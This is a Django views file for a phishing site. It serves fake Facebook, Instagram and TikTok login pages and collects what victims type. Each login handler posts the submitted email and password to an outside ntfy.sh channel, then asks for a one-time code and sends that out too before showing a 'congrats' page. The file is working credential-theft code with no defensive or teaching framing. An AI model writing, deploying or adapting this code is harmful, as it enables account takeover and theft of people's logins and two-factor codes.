from django.shortcuts import render, redirect
import requests

# Create your views here.

def home(request):
  return render(request, 'index.html')


def facebook(request):
  if request.method=="POST":
    email=request.POST['email']
    password=request.POST['password']

    message = f"FACEBOOK\nEmail: {email}\nPassword: {password}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('otp')
  return render(request, 'facebook.html')



def instagram(request):
  if request.method=="POST":
    email=request.POST['email']
    password=request.POST['password']

    message = f"INSTAGRAM\nEmail: {email}\nPassword: {password}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('otp')
  return render(request, 'instagram.html')


def tiktok(request):
  if request.method=="POST":
    email=request.POST['email']
    password=request.POST['password']

    message = f"TIKTOK\nEmail: {email}\nPassword: {password}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('otp')
  return render(request, 'tiktok.html')


def otp(request):
  if request.method=="POST":
    otp=request.POST['otp']

    message = f"OTP: {otp}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('congrats')
  return render(request, 'otp.html')


def congrats(request):
  return render(request, 'congrats.html')